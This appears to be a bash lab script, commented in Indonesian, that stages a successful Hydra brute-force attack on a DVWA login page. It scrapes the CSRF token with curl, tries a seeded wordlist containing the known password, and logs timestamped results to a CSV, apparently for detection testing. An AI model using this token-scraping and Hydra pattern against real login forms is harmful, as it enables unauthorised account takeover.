#!/bin/bash
# Simulasi Brute Force yang BERHASIL menemukan password valid.
# Wordlist harus menyertakan password asli DVWA di salah satu baris.
#
# Jalankan: bash hydra-bruteforce.sh

# ================== KONFIGURASI — WAJIB DIISI ==================
BASE_URL="victim.com"
WORDLIST="/tmp/wordlist-success.txt"
CORRECT_PASSWORD="GANTI_DENGAN_PASSWORD_DVWA_ASLI_ANDA"
LOG_FILE="/tmp/hydra-bruteforce-log.csv"
# ===================================================

# Buat wordlist yang menyertakan password asli di posisi ke-7
# (supaya butuh beberapa percobaan gagal dulu sebelum berhasil, lebih realistis)
cat > "$WORDLIST" << EOF
123456
!password
admin123
qwerty
letmein
dvwa123
${CORRECT_PASSWORD}
Password123!
backup2024
password
EOF

if [ ! -f "$LOG_FILE" ]; then
  echo "run_number,attack_start_utc,attack_end_utc,password_found,attempt_number,notes" > "$LOG_FILE"
fi

echo "=========================================="
echo " Brute Force Test — Successful Attack"
echo "=========================================="

echo "[1/3] Mengambil token login terbaru..."
TOKEN=$(curl -s "https://${BASE_URL}/login.php" | grep -oE "user_token' value='[a-f0-9]+" | grep -oE "[a-f0-9]{20,}")

if [ -z "$TOKEN" ]; then
  echo "GAGAL: Token tidak ditemukan."
  exit 1
fi
echo "    Token: $TOKEN"

ATTACK_START=$(date -u +"%Y-%m-%d %H:%M:%S")
echo "[2/3] Menjalankan Hydra (mencari password valid)..."
echo "    >>> ATTACK START: $ATTACK_START UTC <<<"

HYDRA_OUTPUT=$(hydra -l admin -P "$WORDLIST" -s 443 -t 1 -f \
  "${BASE_URL}" https-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=${TOKEN}:F=Login failed" 2>&1)

ATTACK_END=$(date -u +"%Y-%m-%d %H:%M:%S")
echo "    >>> ATTACK END: $ATTACK_END UTC <<<"

echo "$HYDRA_OUTPUT"

echo "[3/3] Menganalisis hasil..."

if echo "$HYDRA_OUTPUT" | grep -q "\[443\]\[http-post-form\]"; then
  FOUND_LINE=$(echo "$HYDRA_OUTPUT" | grep "\[443\]\[http-post-form\]")
  FOUND_PASS=$(echo "$FOUND_LINE" | grep -oE "password: .*" | sed 's/password: //')
  ATTEMPT_NUM=$(grep -n "^${FOUND_PASS}$" "$WORDLIST" | cut -d: -f1)
  echo ""
  echo "    ✅ PASSWORD DITEMUKAN: $FOUND_PASS (percobaan ke-${ATTEMPT_NUM})"
  echo "${RUN_NUM:-1},${ATTACK_START},${ATTACK_END},YES,${ATTEMPT_NUM},Password ditemukan: ${FOUND_PASS}" >> "$LOG_FILE"
else
  echo ""
  echo "    ⚠️  Password TIDAK ditemukan — cek apakah CORRECT_PASSWORD di script sudah benar"
  echo "${RUN_NUM:-1},${ATTACK_START},${ATTACK_END},NO,N/A,Password tidak ditemukan" >> "$LOG_FILE"
fi

echo ""
echo "=========================================="
echo " Ringkasan"
echo "=========================================="
echo " Attack start (UTC) : $ATTACK_START"
echo " Attack end (UTC)   : $ATTACK_END"
echo " Log tersimpan di   : $LOG_FILE"
echo ""
echo "=========================================="
